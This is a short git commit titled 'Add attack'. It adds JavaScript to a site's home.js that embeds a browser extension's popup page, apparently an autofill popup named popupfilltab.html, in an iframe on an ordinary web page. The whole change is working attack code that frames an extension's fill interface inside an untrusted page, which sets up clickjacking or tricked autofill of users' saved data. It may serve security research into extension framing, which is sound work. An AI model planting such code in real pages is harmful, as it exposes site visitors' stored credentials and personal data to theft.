ce99445c9d2931d50b018b4d2b7fbcc9cdb84fb4
Justin Arieltan <agriad1@yahoo.com>
2021-05-29 10:13:26 +0200

    Add attack

--- public/javascript/home.js
+++ public/javascript/home.js
@@ -1,3 +1,8 @@
 function run() {
+    var iframe = document.createElement("iframe");
+    iframe.height = "10%";
+    iframe.width = "100%";
+    iframe.src = "chrome-extension://omkamdlakallckdjjcnglonboddelkmj/popupfilltab.html";
+    document.body.appendChild(iframe);
     alert("hello");
 }
